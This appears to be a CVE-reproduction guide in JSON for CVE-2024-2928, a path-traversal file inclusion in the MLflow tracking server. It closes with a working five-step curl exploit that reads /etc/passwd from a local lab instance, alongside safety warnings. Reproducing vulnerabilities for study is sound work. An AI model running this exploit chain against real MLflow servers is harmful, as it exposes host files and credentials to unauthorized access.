{
    "overview": "Repository: an MLflow source tree. The CVE (CVE-2024-2928) is a Local File Inclusion via path traversal in the MLflow tracking server: the server fails to validate directory-traversal sequences placed in the **URL fragment** (the part after `#`) of an `artifact_location` URL and also applies local-path containment logic even when the run\u2019s artifact URI is not a local `file://` URI. The two code locations central to the vulnerability are in the server request handlers and source validation logic:\n- `mlflow/server/handlers.py` \u2014 `_create_experiment()` previously validated only the query-string but ignored `parsed.fragment`.\n- `mlflow/server/handlers.py` / `_validate_source()` \u2014 converts URIs to local paths (via `local_file_uri_to_path`) and tests containment without first ensuring the run artifact URI is a `file://` (missing `is_local_uri()` guard).\n\nThis combination allows an attacker to:\n1. create an experiment whose `artifact_location` contains `#../../..` (fragment with `../`),\n2. create a run for that experiment,\n3. create a model version whose `source` resolves to a local file path outside the artifact directory, and\n4. fetch arbitrary host files (e.g. `/etc/passwd`) via the artifact retrieval endpoints.\n\nThe minimal service surface required to reproduce the issue is the MLflow tracking server running locally (no extra DB or artifact store is required for the PoC \u2014 the default file-based backend is sufficient).",
    "files": "- `mlflow/server/handlers.py`  \n  *Why:* This is the primary handler file containing `_create_experiment()` and `_validate_source()` logic mentioned in the CVE. Inspecting the pre-patch code here is required to reproduce the vulnerable behavior and to confirm which parameters are parsed/validated or ignored.\n\n- `mlflow/server/validation.py`  \n  *Why:* Likely contains helpers used by handlers (e.g., `validate_query_string` or other request validation utilities). Confirm what validations are applied and whether fragments are ignored here.\n\n- Any module that defines/exports these helpers:\n  - the (string) utility that converts a `file://` or local URI into a filesystem path (referred to in the CVE as `local_file_uri_to_path`) \u2014 search in the tree for that symbol.  \n  - the helper `is_local_uri()` (or equivalent) that determines if an artifact/run URI is a local `file://` URI \u2014 needed to reproduce the incorrect behavior when that guard is absent.\n\n  *Why:* `_validate_source()` depends on these utilities. To reproduce the exact flow you must locate how URIs are parsed and converted to `pathlib.Path(...).resolve()`.\n\n- `requirements/core-requirements.txt` (and `requirements/test-requirements.txt`)  \n  *Why:* Provide the Python dependency pins you should install if you build or run the server from this source tree. If you prefer to reproduce using the published vulnerable package (recommended, see \"Services / setup\" below), these files still help replicate the runtime environment.\n\n- `mlflow/server/js` (static/js assets) and any router definitions inside `mlflow/server/handlers.py`  \n  *Why:* The PoC uses REST endpoints with paths such as:\n    - `POST /ajax-api/2.0/mlflow/experiments/create`\n    - `POST /api/2.0/mlflow/runs/create`\n    - `POST /ajax-api/2.0/mlflow/registered-models/create`\n    - `POST /ajax-api/2.0/mlflow/model-versions/create`\n    - `GET /model-versions/get-artifact?path=...&name=...&version=...`\n  Confirm these endpoints and the exact parameter names in `handlers.py` before crafting PoC requests.\n\n- (Optional) tests touching tracking, model-registry, or artifact retrieval (under `tests/`): e.g. `tests/server`, `tests/tracking`, `tests/entities/model_registry`  \n  *Why:* Tests may contain utilities or example payloads useful for writing the PoC requests and for verifying expected server behavior.",
    "services": "- Required service: **MLflow tracking server** (single process).  \n  *Configuration to reproduce the CVE (minimal & recommended):*\n  1. Environment: Linux or macOS local machine where the process can read system files (e.g., `/etc/passwd`) for verification. **Run only in a disposable, non-production environment.**\n  2. Python: use a supported Python 3.x (install with virtualenv). For precise dependency versions, see `requirements/core-requirements.txt`. The simplest repro approach (recommended) is to install the released vulnerable package via pip:\n     ```\n     python -m venv venv && source venv/bin/activate\n     pip install \"mlflow==2.9.2\"\n     ```\n     (This avoids building from source. The CVE affects published 2.9.2; use that released wheel.)\n  3. Start server on localhost without authentication:\n     ```\n     mlflow ui --host 127.0.0.1 --port 5000\n     ```\n     or if you prefer server mode:\n     ```\n     mlflow server --host 127.0.0.1 --port 5000\n     ```\n     Ensure it listens on `127.0.0.1:5000` so the PoC curl commands target the correct host/port.\n  4. Backend stores/artifacts: you may use the defaults (local `mlruns` folder and default local artifact handling). No external DB or artifact store is required for the PoC \u2014 the attack works against the tracking server's REST endpoints directly.\n\n- Optional: If reproducing from the local repository (not recommended unless necessary), you must:\n  - install the repository\u2019s Python dependencies (`pip install -r requirements/core-requirements.txt`), then install the package (editable or normal). Because we cannot assume the repo build layout, prefer the pip-release approach unless you specifically must exercise the exact repository code.\n\n- Safety note: Run in an isolated environment (VM or throwaway machine). Do not run this against production systems; the exploit reads sensitive local files.",
    "output": "Final expected result when setup is successful:\n- The MLflow tracking server is reachable at `http://127.0.0.1:5000` and responds to the tracking and model registry REST endpoints.\n\nHow to interact / PoC steps (exact minimal commands \u2014 replace placeholders with returned IDs):\n\n1. Create the malicious experiment (artifact_location contains traversal in fragment):\n```\ncurl -s -X POST http://127.0.0.1:5000/ajax-api/2.0/mlflow/experiments/create \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"name\": \"poc\", \"artifact_location\": \"http:///#/../../../../../../../../../../../../../../etc/\"}'\n```\n- Expected JSON response: contains `\"experiment_id\": \"<EXPERIMENT_ID>\"`.\n\n2. Create a run in the experiment:\n```\ncurl -s -X POST http://127.0.0.1:5000/api/2.0/mlflow/runs/create \\\n     -H 'Content-Type: application/json' \\\n     -d \"{\\\"experiment_id\\\": \\\"<EXPERIMENT_ID>\\\"}\"\n```\n- Expected JSON response: contains `\"run\": {\"info\": {\"run_id\": \"<RUN_ID>\", ...}}`.\n\n3. Register a new model (registry entry):\n```\ncurl -s -X POST http://127.0.0.1:5000/ajax-api/2.0/mlflow/registered-models/create \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"name\": \"poc\"}'\n```\n- Expected JSON: success/registered model name.\n\n4. Create a model version that points to a local `source` (this step leads the server to resolve the malicious artifact_location into a filesystem access path):\n```\ncurl -s -X POST http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create \\\n     -H 'Content-Type: application/json' \\\n     -d \"{\\\"name\\\": \\\"poc\\\", \\\"run_id\\\": \\\"<RUN_ID>\\\", \\\"source\\\": \\\"file:///etc/\\\"}\"\n```\n- Expected JSON response: contains `\"version\": \"1\"` (or numeric version).\n\n5. Fetch arbitrary file (example: `/etc/passwd`) via artifact retrieval endpoint:\n```\ncurl -s \"http://127.0.0.1:5000/model-versions/get-artifact?path=passwd&name=poc&version=1\"\n```\n- Expected output: contents of `/etc/passwd` (or whatever file the path points to), returned by the server due to the resolved traversal escape.\n\nSuccess condition:\n- The `get-artifact` request returns the contents of a host file outside the server\u2019s intended artifact directory \u2014 demonstrating the Local File Inclusion/path-traversal exploitation.\n\nTroubleshooting / verification hints:\n- If the server rejects the `artifact_location` due to later security patches (release \u2265 2.11.3), you will not be able to create the experiment with a fragment \u2014 confirm the installed MLflow version (`python -c \"import mlflow; print(mlflow.__version__)\"`) is 2.9.2.\n- Inspect `mlflow/server/handlers.py` to confirm the code paths being exercised (particularly `_create_experiment()` parsing and `_validate_source()` behavior) if reproducing from source."
}